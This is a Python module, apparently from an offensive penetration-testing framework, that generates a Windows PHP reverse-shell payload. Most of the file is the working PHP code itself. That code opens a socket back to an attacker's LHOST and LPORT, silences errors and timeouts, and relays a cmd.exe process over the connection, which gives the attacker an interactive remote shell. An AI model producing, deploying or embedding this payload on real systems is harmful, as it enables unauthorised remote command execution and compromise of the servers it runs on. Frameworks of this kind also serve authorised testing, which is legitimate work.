# -*- coding: utf-8 -*-

"""
Payload: Windows PHP Reverse Shell
Documentation: N/A
"""

# Python library
from typing import Any

# Library
from lib.utils.printer import (
    print_status,
    printf
)

# Framework
from framework.modules.payload import Payload
from framework.sessions.windows import pulsar_generic
from framework.modules.metadata import (
    Extension,
    Module,
    Arch,
    Platform,
    PayloadHandler
)


class TerasploitModule(Payload):

    def __init__(self):
        self.info = dict(
            Name="Windows PHP Reverse Shell",
            License="BSD-3-Clause License",
            Module=Module.PAYLOAD,
            Arch=Arch.PHP,
            Platform=Platform.PHP,
            PayloadHandler=PayloadHandler.REVERSE_TCP,
            Session=pulsar_generic.session,
            Author=[
                "charlie <castilloncharlie.a[a]gmail.com>"
            ],
            Description=[
                "Connect back on the attacker "
                "machine and spawn an interactive shell."
            ],
            DefaultOptions=["LHOST", "LPORT"]
        )

    def run(self) -> None:
        """ Generate a payload file """

        # Generate payload
        payload = self.generate()

        # Print payload information
        for key in payload.keys():
            print_status(f"{key}: {payload[key]}")

        # New line
        printf()

        # Generate the payload file
        self.generate_file(
            content=payload["Payload"],
            extension=Extension.PHP
        )

    def generate(self) -> dict[str, Any]:

        # Gather the local address and port
        lhost = self.opt("LHOST")
        lport = self.opt("LPORT")

        return self.generate_payload(
            binary=False,
            badchars=None,
            raw_payload=(
                f"{self.PHP_START}"
                f"$addr='{lhost}';"
                f"$port={lport};"
                "$descriptorspec=array("
                "0=>array('pipe','r'),"
                "1=>array('pipe','w'),"
                "2=>array('pipe','w')"
                ");"
                "$buffer=1024;"
                "$error=false;"
                "@error_reporting(0);"
                "@set_time_limit(0);"
                "@umask(0);"
                "$socket=@fsockopen($addr,$port,$errno,"
                "$errstr,30);"
                "if(!$socket){exit;}"
                "stream_set_blocking($socket,false);"
                "$process=@proc_open('cmd.exe',$descriptorspec,"
                "$pipes,null,null);"
                "if(!$process){fclose($socket);exit;}"
                "foreach($pipes as $pipe){"
                "stream_set_blocking($pipe,false);}"
                "do{"
                "$status=proc_get_status($process);"
                "if(feof($socket))break;"
                "if(feof($pipes[1])||!$status['running'])"
                "break;"
                "$streams=array('read'=>array($socket,"
                "$pipes[1],$pipes[2]),'write'=>null,"
                "'except'=>null);"
                "$num_changed=@stream_select("
                "$streams['read'],$streams['write'],"
                "$streams['except'],0);"
                "if($num_changed===false)break;"
                "if($num_changed>0){"
                "if(in_array($socket,$streams['read'])){"
                "while(($data=fread($socket,$buffer))&&"
                "fwrite($pipes[0],$data)){}}"
                "if(in_array($pipes[2],$streams['read'])){"
                "while(($data=fread($pipes[2],$buffer))&&"
                "fwrite($socket,$data)){}}"
                "if(in_array($pipes[1],$streams['read'])){"
                "while(($data=fread($pipes[1],$buffer))&&"
                "fwrite($socket,$data)){}}"
                "}"
                "}while(!$error);"
                "foreach($pipes as $pipe){fclose($pipe);}"
                "proc_close($process);"
                "fclose($socket);"
            ),
        )
